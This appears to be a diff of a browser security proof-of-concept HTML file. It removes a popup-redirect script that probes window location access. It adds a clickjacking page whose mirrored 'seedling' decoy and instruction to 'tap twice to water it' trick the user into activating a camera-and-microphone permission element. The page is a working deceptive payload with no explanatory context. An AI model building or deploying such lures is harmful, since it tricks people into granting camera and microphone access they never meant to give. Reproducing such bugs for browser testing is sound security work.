@@ -1,15 +1,63 @@
-<script>
-function next()
-{
-	w.location.replace('http://www.google.com/index.html');
-	setTimeout("next();",15);
-	setTimeout("next();",25);
-	setTimeout("next();",40);
-}
-function f()
-{
-	w=window.open("test.html#","_blank","width=1350 height=960");
-	i=setTimeout("try{x=w.location.href;}catch(e){clearInterval(i);n=0;next();}",72);
-}
-</script>
-<button onclick="f();">Click here!</button>
+<meta http-equiv="Content-Type" content="text/html;charset=UTF-8">
+
+<style>
+  :root {
+    --top-offset: 55%;
+    --decoy-offset-below: 10%;
+  }
+
+  #instructions {
+    position: absolute;
+    width: 520px;
+    height: 100px;
+    top: 40%;
+    left: 50%;
+    transform: translate(-50%, 0);
+    font-family: sans-serif;
+    font-size: 1.2em;
+  }
+
+  #decoy {  
+    position: absolute;
+    background: #ffffff;
+    width: 300px;
+    height: 100px;
+    top: calc(var(--top-offset) + var(--decoy-offset-below));
+    left: 50%;
+    transform: translate(-50%, 0) rotateX(180deg);
+    -webkit-box-reflect: below 0;
+    z-index: 1;
+    pointer-events: none;
+    font-size: 2.5em;
+    text-align: center;
+  }
+
+  #decoy-decoy {
+    position: absolute;
+    background: #ffffff;
+    width: 300px;
+    height: 100px;
+    top: calc(var(--top-offset) + var(--decoy-offset-below));
+    left: 50%;
+    transform: translate(-50%, 0) rotateX(180deg);
+    z-index: 2;
+  }
+
+  #permission-wrapper {
+    position: absolute;
+    top: var(--top-offset);
+    left: 50%;
+    transform: translate(-50%, 0);
+  }
+  permission {
+    height: 48px;
+  }
+</style>
+<div id="decoy">🌱</div>
+<div id="decoy-decoy"></div>
+
+<div id="instructions">Tap twice on the seedling to water it and make it grow. 💧🌼</div>
+
+<div id="permission-wrapper">
+  <permission id="camera-microphone" type="camera microphone"></permission>
+</div>
